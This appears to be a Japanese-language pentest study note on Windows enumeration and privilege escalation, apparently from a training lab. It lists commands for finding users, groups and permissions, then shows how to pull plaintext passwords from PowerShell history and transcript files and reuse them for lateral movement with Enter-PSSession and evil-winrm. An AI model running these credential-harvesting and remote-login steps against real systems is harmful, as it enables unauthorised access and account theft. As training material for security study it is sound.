### Username and hostname

```cmd
whoami
```
出力からクライアントPCなのか、Webサーバなのかが推測可能

---
### Group memberships of the current user

ユーザの現在の所属グループ

```cmd
whoami /groups
```

出力から現在所属しているグループの持つ権限が推測可能
- helpdesk
- Remote Desktop Users RDP経由での接続が可能

---
### Existing users and groups
すべてのローカルユーザーのリスト

```shell
net user
# すべて表示するにはPowershellを使う
net localgroup
```

```powershell
Get-LocalUser

Get-LocalGroup
Get-LocalGroupMember adminteam
```
---
## icacls

```cmc
icacls C:\Windows
```
---
## PowerShell History
## PowerShell Transcriptionに残されたクレデンシャル
Powershellのログ記録メカニズム
- PowerShell Transcription　肩越しのトランスクリプション
- PowerShell Script Block Logging.

```powershell
# 履歴の確認
Get-History

# 履歴の消去
Clear-History
# Clear-History は PSReadline によって記録されたコマンド履歴を消去しない

(Get-PSReadlineOption).HistorySavePath
```

```powershell
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```powershell
type C:\Users\Public\Transcripts\transcript01.txt
# Enter-PSSession入力時に残されたクレデンシャルが表示される場合がある

# クレデンシャルを利用した横展開
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
whoami
# バインドシェルでWinRM経由でPowerShellリモートセッションを作成すると、予期しない動作が発生する可能性がある（コマンドがうまく反応しない等）。そのためevel-winrmなどを使う
# 管理者は、 Set-PSReadlineOptionコマンドレットで -HistorySaveStyleオプションをSaveNothingに設定することで、PSReadlineによるコマンドの記録を阻止できる
```


```bash
evil-winrm -i 192.168.236.220 -u daveadmin -p "qwertqwertqwert123\!\!"
```

## ScriptBlockCode Log Path
```text
Eventviewer\WIndows Logs\Application and Service Logs\Microsoft\Windows\PowerShell\Operational
```
この中からID4104を探す

---

